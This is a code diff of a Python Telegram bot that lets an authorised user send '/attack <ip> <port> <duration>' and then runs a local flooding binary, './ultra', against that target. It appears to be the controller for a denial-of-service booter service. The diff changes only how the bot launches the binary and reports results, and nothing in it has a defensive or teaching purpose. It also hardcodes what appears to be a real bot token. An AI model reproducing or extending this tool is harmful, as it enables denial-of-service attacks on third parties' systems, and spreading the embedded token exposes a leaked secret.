@@ -1,72 +1,90 @@
-import os
 import asyncio
 from telegram import Update
-from telegram.ext import Application, CommandHandler, CallbackContext
-from telegram.error import TelegramError
+from telegram.ext import Application, CommandHandler, ContextTypes
 
-TELEGRAM_BOT_TOKEN = '8272183377:AAFQSx5Nd1tARAw2Z6PGSDM69X3MrCam9NU'
+TELEGRAM_BOT_TOKEN = "8272183377:AAFQSx5Nd1tARAw2Z6PGSDM69X3MrCam9NU"
 ALLOWED_USER_ID = 6135948216
-bot_access_free = True  
 
-async def start(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    message = (
-        "*🔥 Welcome to the battlefield! 🔥*\n\n"
-        "*Use /attack <ip> <port> <duration>*\n"
-        "*Let the war begin! ⚔️💥*"
+
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "🔥 Bot Online!\nUse: /attack <ip> <port> <duration>"
     )
-    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
+
 
 async def run_attack(chat_id, ip, port, duration, context):
     try:
-        process = await asyncio.create_subprocess_shell(
-            f"./ultra {ip} {port} {duration} 800",
+        # 🔧 Run process
+        process = await asyncio.create_subprocess_exec(
+            "./ultra", ip, port, duration, "800",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
+
         stdout, stderr = await process.communicate()
 
+        # 🔍 Exit code check
+        exit_code = process.returncode
+
         if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
+            print(stdout.decode())
+
         if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"⚠️ Error:\n{stderr.decode()}"
+            )
+
+        # ✅ Proper completion message
+        if exit_code == 0:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text="✅ Process Completed Successfully"
+            )
+        else:
+            await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"❌ Process Failed (code {exit_code})"
+            )
 
     except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"❌ Exception: {str(e)}"
+        )
 
-    finally:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')
 
-async def attack(update: Update, context: CallbackContext):
-    chat_id = update.effective_chat.id
-    user_id = update.effective_user.id  # Get the ID of the user issuing the command
+async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
 
-    # Check if the user is allowed to use the bot
+    # 🔒 Access control
     if user_id != ALLOWED_USER_ID:
-        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
+        await update.message.reply_text("❌ Unauthorized")
         return
 
-    args = context.args
-    if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
+    if len(context.args) != 3:
+        await update.message.reply_text("Usage: /attack <ip> <port> <duration>")
         return
 
-    ip, port, duration = args
-    await context.bot.send_message(chat_id=chat_id, text=( 
-        f"*⚔️ Attack Launched! ⚔️*\n"
-        f"*🎯 Target: {ip}:{port}*\n"
-        f"*🕒 Duration: {duration} seconds*\n"
-        f"*🔥 Let the battlefield ignite! 💥*"
-    ), parse_mode='Markdown')
+    ip, port, duration = context.args
 
-    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))
+    await update.message.reply_text(
+        f"⚔️ Running...\nTarget: {ip}:{port}\nTime: {duration}s"
+    )
+
+    # 🔥 Run in background
+    asyncio.create_task(run_attack(update.effective_chat.id, ip, port, duration, context))
+
 
 def main():
-    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("attack", attack))
+    app = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    application.run_polling()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("attack", attack))
 
-if __name__ == '__main__':
+    print("Bot started...")
+    app.run_polling()
+
+
+if __name__ == "__main__":
     main()
